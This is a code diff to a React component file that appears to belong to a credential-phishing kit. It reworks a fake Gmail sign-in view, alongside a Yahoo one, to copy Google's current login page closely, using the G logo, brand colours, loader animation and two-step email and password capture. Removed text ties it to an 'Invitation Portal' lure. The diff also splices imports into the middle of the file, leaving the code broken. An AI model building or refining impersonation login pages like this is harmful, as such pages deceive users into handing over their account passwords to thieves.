@@ -407,7 +407,21 @@ export const YahooLoginView: React.FC<AuthFormProps> = ({
   );
 };
 
-// 4. GMAIL / GOOGLE SIGN-IN VIEW (Material Design Google Look)
+import React, { useState, useEffect } from 'react';
+import AlertCircle from 'heroicons/outline/alert-circle';
+import Eye from 'heroicons/solid/eye';
+import EyeOff from 'heroicons/solid/eye-off';
+
+// Define the props type
+interface AuthFormProps {
+  initialEmail: string;
+  onCancel: () => void;
+  isLoading: boolean;
+  loadingStep?: string;
+  errorMessage?: string;
+  onSubmit: (email: string, password: string) => void;
+}
+
 export const GmailLoginView: React.FC<AuthFormProps> = ({
   initialEmail,
   onCancel,
@@ -416,14 +430,15 @@ export const GmailLoginView: React.FC<AuthFormProps> = ({
   errorMessage,
   onSubmit
 }) => {
-  // Screen state: 1 = Email screen, 2 = Password screen
   const [step, setStep] = useState<1 | 2>(1);
   const [email, setEmail] = useState(initialEmail || 'guest@gmail.com');
   const [password, setPassword] = useState('');
   const [showPassword, setShowPassword] = useState(false);
   const [localError, setLocalError] = useState<string | null>(null);
 
-  // If the parent modal sends an external error validation message, sync it locally
+  // Track local visual loader state between steps
+  const [isTransitioning, setIsTransitioning] = useState(false);
+
   useEffect(() => {
     if (errorMessage) {
       setLocalError(errorMessage);
@@ -437,7 +452,13 @@ export const GmailLoginView: React.FC<AuthFormProps> = ({
       return;
     }
     setLocalError(null);
-    setStep(2); // Navigate to password step
+
+    // Trigger the official top progress bar loader animation
+    setIsTransitioning(true);
+    setTimeout(() => {
+      setIsTransitioning(false);
+      setStep(2);
+    }, 850);
   };
 
   const handleSubmit = (e: React.FormEvent) => {
@@ -453,57 +474,73 @@ export const GmailLoginView: React.FC<AuthFormProps> = ({
   const handleBackStep = () => {
     setLocalError(null);
     setPassword('');
-    setStep(1); // Go back to email entry
+    setStep(1);
   };
 
   const activeError = localError || errorMessage;
+  const showLoader = isLoading || isTransitioning;
 
   return (
-    <div className="w-full bg-[#f8f9fa] text-[#202124] min-h-[540px] flex flex-col justify-between p-6 sm:p-8 font-['Google_Sans',Roboto,Arial,sans-serif]">
-      <div className="bg-white border border-[#dadce0] rounded-lg p-8 sm:p-10 max-w-[440px] w-full mx-auto my-auto space-y-6">
+    <div className="w-full bg-white text-[#1f1f1f] min-h-[460px] flex flex-col justify-between p-6 sm:p-9 font-sans antialiased selection:bg-blue-100 relative overflow-hidden">
+      
+      {/* NATIVE GOOGLE PROGRESS BAR LOADER */}
+      <div className={`absolute top-0 left-0 right-0 h-1 bg-blue-100 z-50 overflow-hidden transition-opacity duration-300 ${showLoader ? 'opacity-100' : 'opacity-0'}`}>
+        <div className="h-full bg-[#0b57d0] animate-[loading_1.5s_infinite_ease-in-out] origin-[0%_50%] w-full" />
+      </div>
+
+      {/* Main Grid Wrapper matching the modern horizontal split layout */}
+      <div className="flex flex-col md:flex-row gap-6 md:gap-12 flex-grow items-stretch mt-2">
         
-        {/* Brand Header */}
-        <div className="flex flex-col items-center text-center space-y-2">
-          <div className="flex items-center gap-2 mb-1">
-            <GoogleColorLogo className="h-6" />
-            <div className="w-6 h-6 rounded-full bg-white shadow-xs border border-slate-200 flex items-center justify-center p-0.5">
-              <GmailIcon className="w-4 h-4" />
+        {/* Left Section: Branding & Titles */}
+        <div className="flex-1 flex flex-col justify-between min-w-[240px]">
+          <div>
+            {/* Standard G Logo */}
+            <div className="mb-4">
+              <svg className="h-6 w-auto" viewBox="0 0 24 24" xmlns="http://w3.org/2000/svg">
+                <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/>
+                <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
+                <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.06H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.94l2.85-2.22.81-.63z" fill="#FBBC05"/>
+                <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.06l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/>
+              </svg>
+            </div>
+            
+            <h1 className="text-2xl font-normal text-[#1f1f1f] tracking-tight md:text-3xl">
+              {step === 1 ? 'Sign in' : 'Welcome'}
+            </h1>
+            
+            <div className="mt-3 text-sm text-[#444746] leading-relaxed">
+              {step === 1 ? (
+                <span>with your Google Account. This account will be available to other Google apps in the browser.</span>
+              ) : (
+                <button
+                  type="button"
+                  onClick={handleBackStep}
+                  disabled={showLoader}
+                  className="inline-flex items-center gap-1.5 rounded-full border border-gray-300 px-3 py-1 text-sm font-medium text-[#1f1f1f] hover:bg-gray-50 transition-colors disabled:opacity-50"
+                >
+                  <span className="max-w-[160px] truncate">{email}</span>
+                  <svg className="h-4 w-4 text-gray-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 9l-7 7-7-7" />
+                  </svg>
+                </button>
+              )}
             </div>
           </div>
-          <h2 className="text-2xl font-normal text-[#202124]">
-            {step === 1 ? 'Sign in' : 'Welcome'}
-          </h2>
-          
-          {step === 1 ? (
-            <p className="text-sm text-[#5f6368]">to continue to Greenvelope Invitation Portal</p>
-          ) : (
-            <button
-              type="button"
-              onClick={handleBackStep}
-              disabled={isLoading}
-              className="inline-flex items-center gap-1.5 rounded-full border border-gray-300 px-3 py-1 text-xs font-medium text-[#202124] hover:bg-gray-50 transition-colors disabled:opacity-50"
-            >
-              <span className="max-w-[180px] truncate">{email}</span>
-              <svg className="h-3 w-3 text-gray-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 9l-7 7-7-7" />
-              </svg>
-            </button>
-          )}
         </div>
 
-        {/* Global Error Banner */}
-        {activeError && (
-          <div className="text-[#d93025] text-xs flex items-start gap-1.5 bg-[#fce8e6] p-2.5 border border-[#fad2cf] rounded">
-            <AlertCircle className="w-4 h-4 flex-shrink-0 mt-0.5" />
-            <span>{activeError}</span>
-          </div>
-        )}
+        {/* Right Section: Inputs & Navigation Forms */}
+        <div className="flex-1 flex flex-col justify-center min-w-[280px]">
+          {activeError && (
+            <div className="mb-4 text-[#b3261e] text-xs flex items-start gap-1.5 bg-[#fffbfa] p-2.5 border border-[#f9dedc] rounded-md">
+              <AlertCircle className="w-4 h-4 flex-shrink-0 mt-0.5" />
+              <span>{activeError}</span>
+            </div>
+          )}
 
-        {step === 1 ? (
-          /* STEP 1: EMAIL CAPTURE VIEW */
-          <form onSubmit={handleNextStep} className="space-y-5">
-            <div>
-              <div className="relative">
+          {step === 1 ? (
+            /* STEP 1: OUTLINED EMAIL ROW */
+            <form onSubmit={handleNextStep} className="space-y-4">
+              <div className="relative group">
                 <input
                   type="email"
                   value={email}
@@ -511,44 +548,59 @@ export const GmailLoginView: React.FC<AuthFormProps> = ({
                     setEmail(e.target.value);
                     if (localError) setLocalError(null);
                   }}
-                  placeholder="Email or phone"
-                  disabled={isLoading}
+                  disabled={showLoader}
                   required
-                  className="w-full border border-[#dadce0] focus:border-[#1a73e8] rounded px-3.5 py-3 text-sm text-[#202124] outline-none transition-colors focus:ring-1 focus:ring-[#1a73e8]"
+                  placeholder=" "
+                  id="google_email_field"
+                  className={`peer w-full rounded-md border px-3 pb-3 pt-5 text-base outline-none transition-all focus:border-2 focus:px-[11px] focus:pb-[11px] focus:pt-[19px] ${
+                    activeError 
+                      ? 'border-[#b3261e] focus:border-[#b3261e]' 
+                      : 'border-gray-400 focus:border-[#0b57d0]'
+                  }`}
                 />
+                <label
+                  htmlFor="google_email_field"
+                  className={`absolute left-3 top-4 origin-top-left text-base text-[#444746] transition-all duration-200 pointer-events-none
+                    peer-placeholder-shown:translate-y-0 peer-placeholder-shown:scale-100 
+                    peer-focus:-translate-y-3 peer-focus:scale-75 
+                    ${email ? '-translate-y-3 scale-75' : ''}
+                    ${activeError ? 'text-[#b3261e]' : 'peer-focus:text-[#0b57d0]'}`}
+                >
+                  Email or phone
+                </label>
               </div>
-              <div className="text-xs text-[#1a73e8] font-medium pt-1.5 hover:underline cursor-pointer">
+
+              <div className="text-sm font-medium text-[#0b57d0] hover:underline cursor-pointer inline-block">
                 Forgot email?
               </div>
-            </div>
 
-            <div className="text-xs text-[#5f6368] leading-relaxed">
-              Not your computer? Use Guest mode to sign in privately.{' '}
-              <span className="text-[#1a73e8] hover:underline cursor-pointer">Learn more</span>
-            </div>
+              <p className="text-xs text-[#444746] leading-relaxed pt-2">
+                Not your computer? Use Guest mode to sign in privately.{' '}
+                <span className="text-[#0b57d0] font-medium hover:underline cursor-pointer">Learn more about using Guest mode</span>
+              </p>
 
-            <div className="flex items-center justify-between pt-4">
-              <button
-                type="button"
-                onClick={onCancel}
-                disabled={isLoading}
-                className="text-xs font-semibold text-[#1a73e8] hover:text-[#174ea6] cursor-pointer"
-              >
-                Cancel
-              </button>
-              <button
-                type="submit"
-                className="px-6 py-2 bg-[#1a73e8] hover:bg-[#1557b0] text-white text-xs font-medium rounded transition-colors shadow-sm cursor-pointer"
-              >
-                Next
-              </button>
-            </div>
-          </form>
-        ) : (
-          /* STEP 2: PASSWORD CAPTURE VIEW */
-          <form onSubmit={handleSubmit} className="space-y-5">
-            <div>
-              <div className="relative">
+              <div className="flex items-center justify-between pt-6">
+                <button
+                  type="button"
+                  onClick={onCancel}
+                  disabled={showLoader}
+                  className="text-sm font-medium text-[#0b57d0] hover:bg-blue-50 px-3 py-2 rounded-md transition-colors"
+                >
+                  Create account
+                </button>
+                <button
+                  type="submit"
+                  disabled={showLoader}
+                  className="px-6 py-2.5 bg-[#0b57d0] hover:bg-[#0842a0] text-white text-sm font-medium rounded-full transition-all shadow-sm disabled:opacity-50"
+                >
+                  Next
+                </button>
+              </div>
+            </form>
+          ) : (
+            /* STEP 2: OUTLINED PASSWORD ROW */
+            <form onSubmit={handleSubmit} className="space-y-4">
+              <div className="relative group">
                 <input
                   type={showPassword ? 'text' : 'password'}
                   value={password}
@@ -556,69 +608,64 @@ export const GmailLoginView: React.FC<AuthFormProps> = ({
                     setPassword(e.target.value);
                     if (localError) setLocalError(null);
                   }}
-                  placeholder="Enter your password"
-                  disabled={isLoading}
+                  disabled={showLoader}
                   required
                   autoFocus
-                  className="w-full border border-[#dadce0] focus:border-[#1a73e8] rounded px-3.5 py-3 pr-10 text-sm text-[#202124] outline-none transition-colors focus:ring-1 focus:ring-[#1a73e8]"
+                  placeholder=" "
+                  id="google_password_field"
+                  className={`peer w-full rounded-md border px-3 pb-3 pt-5 pr-10 text-base outline-none transition-all focus:border-2 focus:px-[11px] focus:pb-[11px] focus:pt-[19px] ${
+                    activeError 
+                      ? 'border-[#b3261e] focus:border-[#b3261e]' 
+                      : 'border-gray-400 focus:border-[#0b57d0]'
+                  }`}
                 />
+                <label
+                  htmlFor="google_password_field"
+                  className={`absolute left-3 top-4 origin-top-left text-base text-[#444746] transition-all duration-200 pointer-events-none
+                    peer-placeholder-shown:translate-y-0 peer-placeholder-shown:scale-100 
+                    peer-focus:-translate-y-3 peer-focus:scale-75 
+                    ${password ? '-translate-y-3 scale-75' : ''}
+                    ${activeError ? 'text-[#b3261e]' : 'peer-focus:text-[#0b57d0]'}`}
+                >
+                  Enter your password
+                </label>
+                
                 <button
                   type="button"
                   onClick={() => setShowPassword(!showPassword)}
-                  className="absolute right-3 top-3 text-[#5f6368] hover:text-[#202124] cursor-pointer"
+                  className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-500 hover:text-gray-700 cursor-pointer"
                 >
-                  {showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
+                  {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                 </button>
               </div>
-              <div className="pt-2">
-                <label className="flex items-center gap-2 text-xs text-[#5f6368] cursor-pointer select-none">
-                  <input
-                    type="checkbox"
-                    checked={showPassword}
-                    onChange={(e) => setShowPassword(e.target.checked)}
-                    className="rounded text-[#1a73e8] focus:ring-0"
-                  />
-                  <span>Show password</span>
-                </label>
-              </div>
-            </div>
 
-            {isLoading && (
-              <div className="py-1 flex items-center gap-2 text-xs text-[#1a73e8]">
-                <div className="w-3.5 h-3.5 border-2 border-[#1a73e8] border-t-transparent rounded-full animate-spin" />
-                <span>{loadingStep || 'Verifying Google Account credentials...'}</span>
+              <div className="pt-1">
+                <p className="text-sm text-[#444746] leading-relaxed">
+                  {isLoading && loadingStep && <span>{loadingStep}</span>}
+                  <a href="#" className="ml-2 text-[#0b57d0] hover:underline cursor-pointer">Forgot password?</a>
+                </p>
               </div>
-            )}
 
-            <div className="flex items-center justify-between pt-4">
-              <button
-                type="button"
-                onClick={handleBackStep}
-                disabled={isLoading}
-                className="text-xs font-semibold text-[#1a73e8] hover:text-[#174ea6] cursor-pointer disabled:opacity-50"
-              >
-                Back
-              </button>
               <button
                 type="submit"
-                disabled={isLoading}
-                className="px-6 py-2 bg-[#1a73e8] hover:bg-[#1557b0] text-white text-xs font-medium rounded transition-colors shadow-sm cursor-pointer disabled:opacity-50"
+                disabled={showLoader}
+                className="mt-3 w-full px-6 py-2.5 bg-[#0b57d0] hover:bg-[#0842a0] text-white text-sm font-medium rounded-full transition-all shadow-sm disabled:opacity-50"
               >
-                {isLoading ? 'Verifying...' : 'Next'}
+                Next
               </button>
-            </div>
-          </form>
-        )}
+            </form>
+          )}
+        </div>
       </div>
 
-      {/* Footer Meta */}
-      <div className="text-[11px] text-[#5f6368] max-w-[440px] mx-auto w-full pt-3 flex justify-between">
+      {/* Footer System Meta links */}
+      <div className="mt-auto flex items-center justify-between text-xs text-[#444746]">
         <span>English (United States)</span>
-        <div className="flex gap-4">
-          <span>Help</span>
-          <span>Privacy</span>
-          <span>Terms</span>
-        </div>
+        <nav className="space-x-3">
+          <a href="#" className="hover:underline cursor-pointer">Help</a>
+          <a href="#" className="hover:underline cursor-pointer">Privacy</a>
+          <a href="#" className="hover:underline cursor-pointer">Terms</a>
+        </nav>
       </div>
     </div>
   );
